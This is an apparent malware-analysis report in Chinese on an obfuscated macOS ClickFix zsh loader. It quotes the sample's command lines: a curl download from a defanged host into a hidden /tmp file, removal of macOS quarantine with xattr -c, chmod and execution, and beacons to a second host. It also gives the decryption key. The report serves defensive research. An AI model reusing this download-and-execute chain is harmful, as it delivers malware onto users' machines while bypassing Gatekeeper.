---
title: "恶意样本分析：macOS ClickFix zsh loader（SHub 候选）（other · zsh · a9ee0d03）"
published: 2026-11-25
draft: false
description: "恶意（置信度低）：macOS ClickFix zsh loader（SHub 候选） · downloader/dropper · 难度 easy · 纯静态分析"
tags: ["macOS ClickFix", "downloader", "dropper", "Script"]
category: "恶意样本日报"
lang: "zh"
---

> [!WARNING]
> **判定：恶意** · 家族 **macOS ClickFix zsh loader（SHub 候选）**（存疑） · 置信度 **低**
> 
> 别名：SHub、paste-and-run macOS stager、MacClickFix
> 
> 样本是一段经过八进制字符串混淆的 zsh 脚本：先用 md5("115") 派生 AES-128-CTR 密钥，解密内置十六进制密文并 gunzip，得到可直接阅读的第二阶段脚本；第二阶段向 shelter51[.]com 上报 event=pasted，随后从 scope68[.]com 下载可执行文件到 /tmp/.gvcgn67.$$，改名、清除 macOS 隔离属性（xattr -c）、chmod +x 后直接执行，再回传 event=stager。下载并执行远程代码的链路完整且由样本自身代码直接证明。

## 速览

| 项目 | 内容 |
|:--|:--|
| 家族 | **macOS ClickFix zsh loader（SHub 候选）** · 别名 SHub、paste-and-run macOS stager、MacClickFix · _存疑_ |
| 置信度 | **低** |
| 行为类 | downloader · dropper |
| 难度 | easy |
| 首次出现 | 2026-11-23 16:27:34 |
| 分析方法 | 纯静态分析 |
| 来源 | [MalwareBazaar](https://bazaar.abuse.ch/sample/a9ee0d035916b58028618accc7308be6d0b6b356b011137d70c84cd2bbc8caf8/) |

## 攻击链

<svg viewBox="0 0 720 302" width="100%" role="img" aria-label="攻击链概览" xmlns="http://www.w3.org/2000/svg" style="font-family:inherit;font-size:13px;line-height:1.2">
<defs><marker id="acArrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" fill-opacity="0.55"/></marker></defs>
<line x1="26" y1="34" x2="26" y2="234" stroke="currentColor" stroke-opacity="0.22" stroke-width="2"/>
<circle cx="26" cy="34" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="39" fill="currentColor" font-weight="600" font-size="13.5">解密内置二阶段载荷</text>
<text x="470" y="39" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1140</text>
<text x="613" y="38" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="84" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="89" fill="currentColor" font-weight="600" font-size="13.5">八进制编码混淆指令</text>
<text x="470" y="89" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1027</text>
<text x="613" y="88" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="134" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="139" fill="currentColor" font-weight="600" font-size="13.5">伪装探针日志</text>
<text x="470" y="139" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1036</text>
<text x="613" y="138" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="184" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="189" fill="currentColor" font-weight="600" font-size="13.5">上报粘贴执行事件</text>
<text x="470" y="189" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1071.001</text>
<text x="613" y="188" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="234" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="239" fill="currentColor" font-weight="600" font-size="13.5">下载远程第二阶段</text>
<text x="470" y="239" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1105</text>
<text x="613" y="238" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
</svg>

## 样本标识

| 项目 | 值 |
|:--|:--|
| SHA-256 | `a9ee0d035916b58028618accc7308be6d0b6b356b011137d70c84cd2bbc8caf8` |
| MD5 | _未记录_ |
| 大小 | 2,706 字节（2.6 KB） |
| 类型 | other · `zsh` |

## 行为分析

共 **10** 条行为，每条都挂了证据，且全部静态可得。

### 1. 解密内置二阶段载荷

`T1140` · 置信度 **高** · 静态

脚本以 _kb=115 为输入计算 md5 作为 AES-128-CTR 密钥，将三段十六进制字符串经 xxd -r -p 还原后解密，再 gunzip 得到第二阶段 zsh 脚本。

> **证据**：_k=$(printf '%s' "$_kb" | md5)；openssl enc -d -aes-128-ctr -K $_k -iv 0；gunzip；_kb=6*2+6%97+97=115
> 
> **来源**：`ref:6772292def` · `ref:03a1d01430`

### 2. 八进制编码混淆指令

`T1027` · 置信度 **高** · 静态

md5、xxd、openssl、gunzip、curl、xattr、chmod 等命令名与所有 URL 均以 printf 八进制转义形式存放，运行时才还原，规避文本层面的静态检测。

> **证据**：printf 'md5' 等八进制串；第二阶段全部 URL 亦为八进制
> 
> **来源**：`ref:6772292def` · `ref:16ac038b68` · `ref:6f7cf985c8`

### 3. 伪装探针日志

`T1036` · 置信度 **高** · 静态

脚本启动即打印 probe finished / preflight ok，并使用 probe、suite、flavor、feature_flags 等诊断式变量名，掩盖其下载执行行为。

> **证据**：_log "probe finished"；_log "preflight ok"；_suite=manual；_flavor=weekly
> 
> **来源**：`ref:6772292def`

### 4. 上报粘贴执行事件

`T1071.001` · 置信度 **高** · 静态

以 curl 后台 POST 到 shelter51[.]com/api/metrics/run?event=pasted，携带 user 与 BuildID 头，stdout/stderr 全部丢弃。

> **证据**：curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST -H 'user: AgI7...' -H 'BuildID: AgLJ...' hxxps://shelter51[.]com/api/metrics/run?event=pasted
> 
> **来源**：`ref:16ac038b68` · `ref:377e5bd382`

### 5. 下载远程第二阶段

`T1105` · 置信度 **高** · 静态

使用 curl -fsSL 从 scope68[.]com 的固定路径下载文件到 /tmp/.gvcgn67.$$。

> **证据**：curl -fsSL -o /tmp/.gvcgn67.$$ hxxps://scope68[.]com/f/hjyzam087lx6gnvy44p9wa/rs3v3bf2
> 
> **来源**：`ref:16ac038b68` · `ref:377e5bd382`

### 6. 清除隔离属性

`T1553.001` · 置信度 **高** · 静态

对下载文件执行 xattr -c，清除 macOS Gatekeeper 写入的 com.apple.quarantine 扩展属性后再执行。

> **证据**：xattr -c /tmp/.gvcgn67
> 
> **来源**：`ref:16ac038b68` · `ref:377e5bd382`

### 7. 赋权执行下载文件

`T1059.004` · 置信度 **高** · 静态

chmod +x 下载文件后直接以 ${msqwgw} 执行，将控制权交给远程载荷。

> **证据**：chmod +x /tmp/.gvcgn67 && /tmp/.gvcgn67
> 
> **来源**：`ref:16ac038b68` · `ref:377e5bd382`

### 8. 回传执行完成状态

`T1071.001` · 置信度 **高** · 静态

载荷执行后再次后台 POST 到 shelter51[.]com/api/metrics/run?event=stager，使用另一套 user/BuildID 标识。

> **证据**：curl -X POST -H 'user: AgIs...' -H 'BuildID: AgKn...' hxxps://shelter51[.]com/api/metrics/run?event=stager
> 
> **来源**：`ref:16ac038b68` · `ref:377e5bd382` · `ref:2bc6ca2809`

### 9. 使用隐藏临时路径

`T1036.005` · 置信度 **高** · 静态

下载与落地文件使用 /tmp 下的点号隐藏文件名 .gvcgn67，先写带 PID 后缀的临时文件再改名，降低被用户发现的概率。

> **证据**：/tmp/.gvcgn67.$$ → mv → /tmp/.gvcgn67
> 
> **来源**：`ref:16ac038b68` · `ref:377e5bd382`

### 10. 清理临时文件

`T1070.004` · 置信度 **高** · 静态

第一阶段用 mktemp 建立运行临时文件并以 trap 'rm -f "$_run_tmp"' EXIT 在退出时删除，减少落地痕迹。

> **证据**：_run_tmp=$(mktemp -t zbiuqn ...)；trap 'rm -f "$_run_tmp"' EXIT
> 
> **来源**：`ref:6772292def`


## IOC（已去武器化）

### 网络

:::caution
**待动态验证**：上述地址为静态分析所得，分析环境网络隔离下未观察到成功的连接或会话，真实 C2 的响应与下发内容仍未知。
:::

| 类型 | 值 | 端口 | 角色 | 证据来源 | 动态观测 |
|:--|:--|--:|:--|:--|:--|
| http | `hxxps://shelter51[.]com/api/metrics/run?event=pasted` | 443 | c2 | 静态 | ⏳ 未观测 |
| http | `hxxps://scope68[.]com/f/hjyzam087lx6gnvy44p9wa/rs3v3bf2` | 443 | download | 静态 | ⏳ 未观测 |
| http | `hxxps://shelter51[.]com/api/metrics/run?event=stager` | 443 | c2 | 静态 | ⏳ 未观测 |

### 主机

**落地路径**

- `/tmp/.gvcgn67.$$`
- `/tmp/.gvcgn67`

### 配置

| 键 | 值 | 必需 | 证据来源 |
|:--|:--|:--|:--|
| `c2_hosts` | `shelter51[.]com; scope68[.]com` | 是 | 静态 |
| `c2_port` | `443` | 是 | 静态 |
| `c2_uri` | `/api/metrics/run?event=pasted ; /api/metrics/run?event=stager ; /f/hjyzam087lx6gnvy44p9wa/rs3v3bf2` | 是 | 静态 |
| `encryption_algo` | `AES-128-CTR（key=md5('115')=2b44928ae11fb9384c4cf38708677c48，IV=全零，外层 gzip）` | 是 | 静态 |
| `download_path` | `/tmp/.gvcgn67.$$ → /tmp/.gvcgn67` | 是 | 静态 |
| `http_headers` | `user / BuildID（两套 base64url 二进制标识，用于区分 pasted 与 stager 请求）` | 否 | 静态 |
| `telemetry_events` | `pasted, stager` | 是 | 静态 |

## 不应误判

:::important
以下结论**容易被误判**，引用本报告时请注意。

- 不能仅凭出现加密与下载就断言最终载荷是勒索软件或窃密程序；本次未取得 scope68[.]com 下发的内容，最终功能未知。
- 不能把该脚本当作 Windows/PE 恶意软件；xattr 与 /tmp 路径说明其面向 macOS。
- 未与 shelter51[.]com、scope68[.]com 建立真实连接，不能声称观测到 C2 会话、响应内容或受害者数据外传。
- 不能把 base64url 的 user/BuildID 头直接解读为可读的活动编号或主机标识，其内容为二进制且未解密。
:::

## 分析方法与局限

| 项目 | 内容 |
|:--|:--|
| 分析方法 | 纯静态分析 |
| 脱壳 | 是（stage2 `9a727fa5f628f64df7b8eca1598990e5d7def2b2211b1edf8e3d71ecccf3e0fc`） |

**局限与待验证**

1. 本次为纯静态分析，未执行样本，也未与 shelter51[.]com/scope68[.]com 建立任何真实连接；下载载荷、C2 响应和最终家族均未观测。
2. 第二阶段脚本仅经静态解密与反混淆还原，未在运行时验证。
3. user/BuildID 为 base64url 编码的二进制标识，解码后无可读字段，无法据此确认受害者或活动编号。
4. 最终载荷的哈希、行为与家族无法确定，因此家族归因仅为候选，置信度低。

## 证据索引

<details>
<summary>展开 7 条工具证据</summary>

| 证据 ID | 工具 | 摘要 |
|:--|:--|:--|
| `ref:857f2a403b` | file/hash | 确认样本为 2706 字节 zsh 脚本，路径与给定 SHA-256 一致。 |
| `ref:6772292def` | static-read | 读取第一阶段脚本，识别 md5/xxd/openssl/gunzip 解密链与 _kb=115 的密钥推导。 |
| `ref:03a1d01430` | python-decrypt | 按样本逻辑用 md5('115') 作 AES-128-CTR 密钥解密并 gunzip，成功还原 1694 字节第二阶段脚本。 |
| `ref:16ac038b68` | static-read | 读取第二阶段脚本，确认 curl 上报、下载、xattr -c、chmod +x、执行链路。 |
| `ref:377e5bd382` | python-deobf | 还原第二阶段全部八进制字符串，得到明文 URL、路径与请求头。 |
| `ref:2bc6ca2809` | python-decode | 对 user/BuildID 头做 base64url 解码，结果为 33/39 字节二进制，无可读文本。 |
| `ref:84db5bd148` | python-hash | 计算样本文件 SHA-256/MD5 并枚举第一阶段内嵌的十六进制常量。 |

</details>

---

_本报告样本不公开，IOC 已去武器化，仅供安全研究。_
